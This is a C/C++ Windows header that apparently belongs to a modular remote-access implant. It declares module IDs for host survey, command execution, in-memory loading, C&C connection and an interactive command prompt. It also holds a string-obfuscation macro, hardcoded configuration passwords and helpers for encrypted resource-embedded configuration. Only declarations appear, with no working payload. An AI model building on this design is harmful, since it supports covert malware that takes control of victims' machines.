#pragma once
#ifndef __LIB_Utilities__
#define __LIB_Utilities__

#include <Windows.h>
#include "cJSON.h"


#define TSM_ANY_FAMILY									(0x00000000)
#define TSM_CONFIGURATION_FAMILY						(0x01000000)
#define TSM_STORAGE_FAMILY								(0x02000000)
#define		TSM_STORAGE_ALTERNATE_DATA_STREAM_ID		(TSM_STORAGE_FAMILY		| 0x00010000)
#define TSM_SURVEY_FAMILY								(0x03000000)
#define		TSM_SURVEY_REGISTRY_ID						(TSM_SURVEY_FAMILY		| 0x00010000)
#define		TSM_SURVEY_FILE_ID							(TSM_SURVEY_FAMILY		| 0x00020000)
#define		TSM_SURVEY_PROCESS_ID						(TSM_SURVEY_FAMILY		| 0x00030000)
#define		TSM_SURVEY_NETWORK_ID						(TSM_SURVEY_FAMILY		| 0x00040000)
#define		TSM_SURVEY_HOST_ID							(TSM_SURVEY_FAMILY		| 0x00050000)
#define TSM_EXECUTER_FAMILY								(0x04000000)
#define		TSM_EXECUTER_EXECUTE_COMMAND_ID				(TSM_EXECUTER_FAMILY	| 0x00010000)
#define TSM_LOADER_FAMILY								(0x05000000)
#define		TSM_LOADER_MEMORYMODULE_ID					(TSM_LOADER_FAMILY		| 0x00010000)
#define TSM_CNC_FAMILY									(0x06000000)
#define		TSM_INTERNET_CONNECT_ID						(TSM_CNC_FAMILY			| 0x00010000)
#define TSM_INTERACTIVE_FAMILY							(0x07000000)
#define		TSM_INTERACTIVE_COMMAND_PROMPT_ID			(TSM_INTERACTIVE_FAMILY	| 0x00010000)
#define TSM_MANAGER_FAMILY								(0x08000000)
#define		TSM_MANAGER_BASIC_ID						(TSM_MANAGER_FAMILY		| 0x00010000)

#define TSM_ANY_MESSAGE									(TSM_ANY_FAMILY|0x00000000)

//#define TSM_CONFIGURATION								(TSM_CONFIGURATION_FAMILY|0x00000001)
#define	TSM_CONFIGURATION_SETTINGS						"configuration_settings"
#define TSM_CONFIGURATION_BINARY_ID						"binary_id"
#define TSM_CONFIGURATION_AGENT_ID						"agent_id"
#define TSM_CONFIGURATION_PASSWORD						"password"
#define TSM_CONFIGURATION_REGISTER						"manager_register"
#define	TSM_CONFIGURATION_UNREGISTER					"manager_unregister"



//#define TSM_MANAGER_REGISTER								(TSM_MANAGER_FAMILY		| 0x00000001)		
#define TSM_MANAGER_REGISTER_REQUEST						"manager_register_request"
#define TSM_MANAGER_REGISTER_REQUEST_MESSAGE_HANDLER_TYPE	"message_handler_type"
#define TSM_MANAGER_REGISTER_REQUEST_MESSAGE_HANDLER		"message_handler"
#define TSM_MANAGER_REGISTER_RESPONSE						"manager_register_response"
#define TSM_MANAGER_REGISTER_RESPONSE_RESULT				"result"
//#define TSM_MANAGER_UNREGISTER							(TSM_MANAGER_FAMILY		| 0x00000002)
#define TSM_MANAGER_UNREGISTER_REQUEST						"manager_unregister_request"
#define TSM_MANAGER_UNREGISTER_REQUEST_MESSAGE_HANDLER_TYPE	"message_handler_type"
#define TSM_MANAGER_UNREGISTER_RESPONSE						"manager_unregister_response"
#define TSM_MANAGER_UNREGISTER_RESPONSE_RESULT				"result"
//#define TSM_MANAGER_DISPATCH_MESSAGE						(TSM_MANAGER_FAMILY		| 0x00000003)
#define TSM_MANAGER_DISPATCH_MESSAGE_REQUEST				"manager_dispatch_message_request"
#define TSM_MANAGER_DISPATCH_MESSAGE_REQUEST_MESSAGE_ID		"message_id"
#define TSM_MANAGER_DISPATCH_MESSAGE_REQUEST_COMMAND		"command"
//#define TSM_MANAGER_DISPATCH_MESSAGE_RESPONSE				"manager_dispatch_message_response"
#define TSM_MANAGER_DISPATCH_MESSAGE_RESPONSE_RESPONSE		"response"
#define TSM_MANAGER_LIST_HANDLERS_REQUEST					"manager_list_handlers_request"
//#define TSM_MANAGER_LIST_HANDLERS_RESPONSE					"manager_list_handlers_response"
#define TSM_MANAGER_LIST_HANDLERS_RESPONSE_HANDLERS			"message_handlers"




#define SZ_DEFAULT_Initialization_FUNC_NAME				"Initialization"
#define SZ_DEFAULT_Finalization_FUNC_NAME				"Finalization"
typedef DWORD(WINAPI* f_CallbackInterface)(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
	);


//BOOL RegisterModuleMessageHandler(const cJSON* lpJsonConfiguration, const DWORD dwModuleId, const DWORD dwMessageId, const f_CallbackInterface fpMessageHandler);
//BOOL UnregisterModuleMessageHandler(const cJSON* lpJsonConfiguration, const DWORD dwModuleId, const DWORD dwMessageId );

BOOL RegisterModuleMessageHandler(const cJSON* lpJsonConfiguration, const CHAR* szMessageHandlerType, const f_CallbackInterface fpMessageHandler);
BOOL UnregisterModuleMessageHandler(const cJSON* lpJsonConfiguration, const CHAR* szMessageHandlerType);



#define MIX_TEXT_INIT(NUMBER_OF_STRINGS,MAX_LENGTH_OF_STRINGS) \
CHAR  __szMixTextBuffer[NUMBER_OF_STRINGS][MAX_LENGTH_OF_STRINGS]; \
DWORD __dwMixTextMaxCount = NUMBER_OF_STRINGS; \
DWORD __dwMixTextCurrentCount = 0; \
DWORD __dwMixTextMaxSize = MAX_LENGTH_OF_STRINGS;
#define MIX_TEXT_FINI \
{ \
	for(DWORD i=0;i<__dwMixTextMaxCount;i++) \
		memset(__szMixTextBuffer[i],0,__dwMixTextMaxSize); \
}

#define _(INPUT_STRING) __MixTextDecrypt("_InitMT_"##INPUT_STRING##"_FiniMT_",__szMixTextBuffer[(__dwMixTextCurrentCount++%__dwMixTextMaxCount)],__dwMixTextMaxSize)

LPSTR __MixTextDecrypt(LPCSTR szInputString, LPSTR szOutputString, DWORD dwOutputStringSize);


#define CONFIGURATION_DEFAULT_BUFSIZE					4096
#define CONFIGURATION_DEFAULT_MAGIC_NUMBER				"{90DEB964-F2FB-4DB8-9BCA-7D5D10D3A0EB}"
#define CONFIGURATION_DEFAULT_PASSWORD					"{E3AEA3F6-D548-4989-9A42-80BAC9321AE0}"
#define CONFIGURATION_RESOURCE_DEFAULT_PASSWORD			"{E3AEA3F6-D548-4989-9A42-80BAC9321AE1}"
#define CONFIGURATION_RESOURCE_DEFAULT_RESOURCE_TYPE	(10)	//RT_RCDATA           MAKEINTRESOURCE(10)
#define CONFIGURATION_RESOURCE_DEFAULT_RESOURCE_NAME	(1)


DWORD GetConfigurationFromResource( 
	IN DWORD dwResourceType, 
	IN DWORD dwResourceName, 
	IN LPBYTE	lpPasswordBuffer,
	IN DWORD	dwPasswordBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
);

DWORD GetConfigurationFromBinary(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	IN LPBYTE	lpPasswordBuffer,
	IN DWORD	dwPasswordBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
);






HMODULE GetCurrentModule();



DWORD ALLOC(
	IN DWORD	dwSize, 
	OUT LPVOID* lpBuffer
);
DWORD FREE(
	IN LPVOID	lpBuffer
);


DWORD CompressBuffer(
	IN PBYTE	lpSourceBuffer, 
	IN DWORD	dwSourceBufferSize, 
	OUT PBYTE*	lppDestinationBuffer, 
	OUT PDWORD	lpdwDestinationBufferSize
);
DWORD DecompressBuffer(
	IN PBYTE	lpSourceBuffer, 
	IN DWORD	dwSourceBufferSize, 
	OUT PBYTE*	lppDestinationBuffer, 
	OUT PDWORD	lpdwDestinationBufferSize
);


DWORD EncryptBuffer(
	IN PBYTE	lpSourceBuffer,
	IN DWORD	dwSourceBufferSize,
	OUT PBYTE*	lppDestinationBuffer,
	OUT PDWORD	lpdwDestinationBufferSize,
	IN PBYTE	lpPasswordBuffer, 
	IN DWORD	dwPasswordBufferSize, 
	IN DWORD	dwAlgorithmID = CALG_AES_256
);
DWORD DecryptBuffer(
	IN PBYTE	lpSourceBuffer,
	IN DWORD	dwSourceBufferSize,
	OUT PBYTE*	lppDestinationBuffer,
	OUT PDWORD	lpdwDestinationBufferSize,
	IN PBYTE	lpPasswordBuffer,
	IN DWORD	dwPasswordBufferSize,
	IN DWORD	dwAlgorithmID = CALG_AES_256
);

DWORD EncodeBuffer(
	IN PBYTE	lpSourceBuffer,
	IN DWORD	dwSourceBufferSize,
	OUT PBYTE*	lppDestinationBuffer,
	OUT PDWORD	lpdwDestinationBufferSize,
	IN DWORD	dwEncodingType = CRYPT_STRING_BASE64
);
DWORD DecodeBuffer(
	IN PBYTE	lpSourceBuffer,
	IN DWORD	dwSourceBufferSize,
	OUT PBYTE*	lppDestinationBuffer,
	OUT PDWORD	lpdwDestinationBufferSize,
	IN DWORD	dwEncodingType = CRYPT_STRING_BASE64
);


DWORD CompressEncryptEncodeBuffer(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	IN LPBYTE	lpPasswordBuffer,
	IN DWORD	dwPasswordBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
);

DWORD DecodeDecryptDecompressBuffer(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	IN LPBYTE	lpPasswordBuffer,
	IN DWORD	dwPasswordBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
);


DWORD ReadFileIntoBuffer(
	IN	LPSTR	lpszFileName,
	OUT	LPBYTE*	lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
);

DWORD WriteFileOutToDisk(
	IN	LPSTR	lpszFileName,
	IN	LPBYTE	lpInputBuffer,
	IN  DWORD   dwInputBufferSize,
	IN OPTIONAL	DWORD	dwDisposition,
	IN OPTIONAL	DWORD	dwAttributes
);



#endif
